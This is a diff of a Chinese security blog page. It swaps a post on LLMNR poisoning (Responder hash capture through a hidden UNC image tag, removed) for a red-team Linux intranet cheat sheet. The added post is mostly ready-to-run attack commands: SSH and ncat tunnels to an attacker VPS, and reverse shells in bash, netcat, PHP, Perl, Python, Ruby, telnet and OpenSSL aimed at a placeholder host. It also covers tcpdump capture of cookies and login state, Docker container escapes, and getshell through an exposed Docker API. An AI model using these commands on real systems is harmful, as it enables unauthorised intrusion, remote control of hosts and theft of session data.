@@ -4,11 +4,14 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="LLMNR Poison内网攻击技术, Danie1&#39;s Blog">
-    <meta name="description" content="LLMNR Poison内网攻击技术
-攻击者在启动 Responder 后，当受害者去访问一个在当前局域网中不存在的主机时就会触发 LLMNR Poison 攻击，如下图所示：
+    <meta name="keywords" content="红蓝对抗之Linux内网渗透, Danie1&#39;s Blog">
+    <meta name="description" content="红蓝对抗之Linux内网渗透
+ 隧道
+ Linux上可以利用自带和第三方工具进行隧道开启，利用隧道，我们可以建立Socks连接、端口转发等操作。
 
-受害者主机 PING 一台局域网中并不存在的主机。Respo">
+SSH
+Linux使用SSH常用的开启隧道的命令。
+场景1：在控制A机器时，利用socks代">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +19,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>LLMNR Poison内网攻击技术 | Danie1&#39;s Blog</title>
+    <title>红蓝对抗之Linux内网渗透 | Danie1&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/medias/logo.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -262,12 +265,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/26.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/30.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">LLMNR Poison内网攻击技术</h1>
+                    <h1 class="description center-align post-title">红蓝对抗之Linux内网渗透</h1>
                 </div>
             </div>
         </div>
@@ -388,6 +391,10 @@
                                 <span class="chip bg-color">内网渗透</span>
                             </a>
                         
+                            <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+                                <span class="chip bg-color">红蓝对抗</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -409,7 +416,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-12-26
+                    2020-12-27
                 </div>
                 
 
@@ -426,24 +433,99 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="LLMNR-Poison内网攻击技术"><a href="#LLMNR-Poison内网攻击技术" class="headerlink" title="LLMNR Poison内网攻击技术"></a>LLMNR Poison内网攻击技术</h1><hr>
-<p>攻击者在启动 Responder 后，当受害者去访问一个在当前局域网中不存在的主机时就会触发 LLMNR Poison 攻击，如下图所示：</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229142233.png"></p>
-<p>受害者主机 PING 一台局域网中并不存在的主机。Responder 会响应 LLMNR 的广播包并进行了 Poison 攻击。在受害者的主机中 NetBIOS 缓存中已经加入了被 Poison 攻击的主机 IP 记录。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229142423.png"></p>
-<p>受害者访问一个不存在的主机的共享。这样可以获得受害者主机的 HASH 。</p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229142718.png"></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229142651.png"></p>
-<p>在html页面中插入不存在的共享，也可获取主机hash。</p>
-<p>html页面内容如下：</p>
-<p><code>&lt;img/src=\\TEST\1.jpg width=0 height=0&gt;</code></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229143446.png"></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229143532.png"></p>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/QQ%E6%88%AA%E5%9B%BE20201229143410.png"></p>
-<p>或者使用js文件，内容如下：</p>
-<pre><code class="js">var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)
-fso.FileExists(&quot;//ABC/aa&quot;)</code></pre>
-<p><img src="https://jxustctf-img.oss-cn-beijing.aliyuncs.com/jxustctf-img/image-20201229164155650.png"></p>
+                <h1 id="红蓝对抗之Linux内网渗透"><a href="#红蓝对抗之Linux内网渗透" class="headerlink" title="红蓝对抗之Linux内网渗透"></a>红蓝对抗之Linux内网渗透</h1><hr>
+<p> <strong>隧道</strong></p>
+<p> Linux上可以利用自带和第三方工具进行隧道开启，利用隧道，我们可以建立Socks连接、端口转发等操作。</p>
+<blockquote>
+<p><strong>SSH</strong></p>
+<p>Linux使用SSH常用的开启隧道的命令。</p>
+<p>场景1：在控制A机器时，利用socks代理进入A机器所在内网</p>
+<p><code>ssh -qTfnN -D 1111 root@1.1.1.1</code></p>
+<p>输入A机器的密码，本地利用proxychains等类似工具连接本地的1111端口的sock5连接即可代理A机器的网络。</p>
+<p>场景2：如果控制A、B机器，A能访问B，且能出网，B能访问C，但不能出网，A不能访问C</p>
+<p>在A机器上执行：</p>
+<p><code>ssh -CNfg -L 2121:CIP:21 root@BIP</code></p>
+<p>输入BIP机器的密码，访问A的2121端口即是访问CIP的21端口。</p>
+<p>场景3：控制A机器，A能访问B</p>
+<p>A机器执行：</p>
+<p><code>ssh -CNfg -R 2121:BIP:21 root@hackervps</code></p>
+<p>输入vps的密码，访问vps的2121端口即是访问BIP的21端口。</p>
+<p><strong>nc/ncat</strong></p>
+<p>服务端执行监听命令：</p>
+<p><code>ncat --sh-exec &quot;ncat 127.0.0.1 22&quot; -l 80 --keep-open</code></p>
+<p>客户端连接服务器端的80端口即可SSH连接</p>
+<p><code>ssh root@serverip -p 80</code></p>
+<p><strong>portmap</strong></p>
+<p>服务端执行：</p>
+<p><code>portmap -m 1 -p1 80 -h2 127.0.0.1 -p2 22</code></p>
+<p>客户端连接服务端的80端口即可SSH连接：</p>
+<p><code>SSH root@serverip -p 80</code></p>
+<p><strong>portfw</strong></p>
+<p>服务端执行：</p>
+<p><code>tcpfwd 0.0.0.0:443 127.0.0.1:22</code></p>
+<p>客户端连接服务端的443端口即可SSH连接：</p>
+<p><code>ssh root@serverip -p 443</code></p>
+<p><strong>反弹shell</strong></p>
+<h2 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h2><pre><code>bash -c &#39;exec bash -i &amp;&gt;/dev/tcp/yourip/yourport &lt;&amp;1&#39;</code></pre>
+<h2 id="netcat"><a href="#netcat" class="headerlink" title="netcat"></a>netcat</h2><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc yourip yourport &gt;/tmp/f</code></pre>
+<h2 id="php"><a href="#php" class="headerlink" title="php"></a>php</h2><pre><code>php -r &#39;$sock=fsockopen(getenv(&quot;yourip&quot;),getenv(&quot;yourport&quot;));exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;</code></pre>
+<h2 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h2><pre><code>perl -e &#39;use Socket;$i=&quot;$ENV&#123;yourip&#125;&quot;;$p=$ENV&#123;yourport&#125;;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#39;</code></pre>
+<h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre><code>python -c &#39;import sys,socket,os,pty;s=socket.socket()  s.connect((os.getenv(&quot;yourip&quot;),int(os.getenv(&quot;yourport&quot;))))  [os.dup2(s.fileno(),fd) for fd in (0,1,2)]  pty.spawn(&quot;/bin/sh&quot;)&#39;</code></pre>
+<h2 id="ruby"><a href="#ruby" class="headerlink" title="ruby"></a>ruby</h2><pre><code>ruby -rsocket -e &#39;exit if fork;c=TCPSocket.new(ENV[&quot;yourip&quot;],ENV[&quot;yourport&quot;]);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#39;</code></pre>
+<h2 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h2><pre><code>TF=$(mktemp -u); mkfifo $TF &amp;&amp; telnet 127.0.0.1 1337 0&lt;$TF | /bin/sh 1&gt;$TF</code></pre>
+<h2 id="openssl-加密"><a href="#openssl-加密" class="headerlink" title="openssl 加密"></a>openssl 加密</h2><p>服务端生成证书：</p>
+<pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre>
+<p>服务端监听：</p>
+<pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port 8888</code></pre>
+<p>受控端执行：</p>
+<pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect yourip:yourport &gt; /tmp/s; rm /tmp/s</code></pre>
+<p><strong>完全交互式shell</strong></p>
+<p>attack端执行：</p>
+<p><code>stty -echo raw; nc -lp 1337; stty sane</code></p>
+<p>victim端执行：</p>
+<p><code>nc -c &#39;/bin/bash -c &quot;script /dev/null&quot;&#39; yourip 1337</code></p>
+</blockquote>
+<p><strong>tcpdump</strong></p>
+<p>tcpdump是一款网络抓包的程序，在SSO、零信任的场景中，我们可以利用它来获取用户的登录态、Cookie等敏感信息，然后利用这些信息去登录其他未做隔离的站点。<br>下面是抓取http数据包的命令示例：</p>
+<pre><code>tcpdump -i eth1 -s 0 -A &#39;tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x47455420 or tcp[((tcp[12:1] &amp; 0xf0) &gt;&gt; 2):4] = 0x504f5354&#39;</code></pre>
+<p><strong>docker</strong></p>
+<p>判断是否是docker环境</p>
+<ul>
+<li>进程数很少，比如少于10条</li>
+<li>常见的命令没有，比如没有wget</li>
+<li>存在/.dockerenv文件</li>
+<li>/proc/1/cgroup内包含“docker”字符串</li>
+</ul>
+<h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>逃逸是指我们在容器中逃逸到宿主机中。</p>
+<h4 id="特权容器"><a href="#特权容器" class="headerlink" title="特权容器"></a>特权容器</h4><p>当容器是以特权启动时，docker将允许容器访问宿主机上的所有设备。<br>如下容器是进行特权启动(docker run —privileged)的，我们可以把宿主机磁盘挂载进容器里，然后进行相关的逃逸操作，包括不限于更改计划任务、文件。</p>
+<pre><code>fdisk -l|grep /dev/vda1
+mkdir /test
+mount /dev/vda1 /test
+chroot /test</code></pre>
+<h4 id="Docker-Socket"><a href="#Docker-Socket" class="headerlink" title="Docker Socket"></a>Docker Socket</h4><p>/var/run/docker.sock文件是Docker守护进程默认监听的Unix域套接字，容器中的进程可以通过该文件与docker守护进程进行通信。</p>
+<p>当攻击者可控的容器内挂载了该文件，我们也可以对其进行逃逸。<br>首先我们用如下命令创建一个特权测试容器：</p>
+<pre><code>docker run -itd -v /var/run/docker.sock:/var/run/docker.sock  d6e46aa2470d</code></pre>
+<p>比如我们控制了上述容器，并发现其挂载了docker.sock</p>
+<p>那么我们可以利用/var/run/docker.sock创建特权容器（附录5）：</p>
+<pre><code>docker -H unix:///var/run/docker.sock pull alpine:latest
+docker -H unix:///var/run/docker.sock run -d -it --name rshell -v &quot;/proc:/host/proc&quot; -v &quot;/sys:/host/sys&quot; -v &quot;/:/rootfs&quot; --network=host --privileged=true --cap-add=ALL alpine:latest
+docker -H unix:///var/run/docker.sock start rshell
+docker -H unix:///var/run/docker.sock exec -it rshell /bin/sh</code></pre>
+<h3 id="未授权访问"><a href="#未授权访问" class="headerlink" title="未授权访问"></a>未授权访问</h3><p>当默认端口为2375的Docker Remote API对外未授权开放时，攻击者可以利用该漏洞进行getshell。<br>未授权测试过程：<br>获取所有images列表：</p>
+<pre><code>curl http://host:2375/containers/json</code></pre>
+<p>获取运行中的容器：</p>
+<pre><code>docker -H tcp://host:2375 ps</code></pre>
+<p>getshell过程：<br>获取镜像:</p>
+<pre><code>docker -H tcp://host:2375 images</code></pre>
+<p>根据镜像创建容器，把宿主机根目录挂载到容器中：</p>
+<pre><code>docker -H tcp://host:2375 run -it -v /:/mnt/ image_id /bin/bash</code></pre>
+<p>创建容器后没自动进入容器的话，可以利用ps查看创建容器的CONTAINER ID：</p>
+<pre><code>docker -H tcp://host:2375 ps</code></pre>
+<p>然后进入容器:</p>
+<pre><code>docker -H tcp://host:2375 exec -it CONTAINERID sh</code></pre>
+<p>进入到挂载进来的磁盘中，并切换根目录，则可以看到宿主机进程：</p>
+<pre><code>chroot /mnt sh</code></pre>
+<p>因为挂载把宿主机根目录挂载到了容器中的/mnt目录中，就再次回到了上述逃逸的攻击手段了，其他就不再赘述。</p>
 
             </div>
             <hr/>
@@ -469,7 +551,7 @@ fso.FileExists(&quot;//ABC/aa&quot;)</code></pre>
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://danie1233.github.io/2020/12/26/LLMNR%20Poison%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">https://danie1233.github.io/2020/12/26/LLMNR%20Poison%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/</a>
+                    <a href="https://danie1233.github.io/2020/12/27/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BLinux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">https://danie1233.github.io/2020/12/27/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BLinux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -511,6 +593,10 @@ fso.FileExists(&quot;//ABC/aa&quot;)</code></pre>
                                     <span class="chip bg-color">内网渗透</span>
                                 </a>
                             
+                                <a href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">
+                                    <span class="chip bg-color">红蓝对抗</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -549,9 +635,10 @@ fso.FileExists(&quot;//ABC/aa&quot;)</code></pre>
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2020/12/27/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B9%8BLinux%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
                     <div class="card-image">
@@ -575,9 +662,9 @@ Linux使用SSH常用的开启隧道的命令。
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-12-27
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-27
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -590,6 +677,7 @@ Linux使用SSH常用的开启隧道的命令。
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -612,34 +700,34 @@ Linux使用SSH常用的开启隧道的命令。
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2020/08/29/emlog%206.0.0%E5%AE%A1%E8%AE%A1/">
+                <a href="/2020/12/26/LLMNR%20Poison%E5%86%85%E7%BD%91%E6%94%BB%E5%87%BB%E6%8A%80%E6%9C%AF/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/20.jpg" class="responsive-img" alt="emlog 6.0.0审计">
+                        <img src="/medias/featureimages/26.jpg" class="responsive-img" alt="LLMNR Poison内网攻击技术">
                         
-                        <span class="card-title">emlog 6.0.0审计</span>
+                        <span class="card-title">LLMNR Poison内网攻击技术</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            emlog 6.0.0审计
-后台删除评论sql注入admin/comment.php
+                            LLMNR Poison内网攻击技术
+攻击者在启动 Responder 后，当受害者去访问一个在当前局域网中不存在的主机时就会触发 LLMNR Poison 攻击，如下图所示：
 
-当action为delbyip时，判断token，并且GET传入的ip地址未经过滤带入delcommentbyip方法。跟踪该方法。定义在include
+受害者主机 PING 一台局域网中并不存在的主机。Respo
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-08-29
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-12-26
                             </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="post-category">
-                                    代码审计
+                            <a href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="post-category">
+                                    内网渗透
                                 </a>
                             
                             
@@ -649,12 +737,8 @@ Linux使用SSH常用的开启隧道的命令。
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/PHP/">
-                        <span class="chip bg-color">PHP</span>
-                    </a>
-                    
-                    <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">
-                        <span class="chip bg-color">代码审计</span>
+                    <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">
+                        <span class="chip bg-color">内网渗透</span>
                     </a>
                     
                 </div>
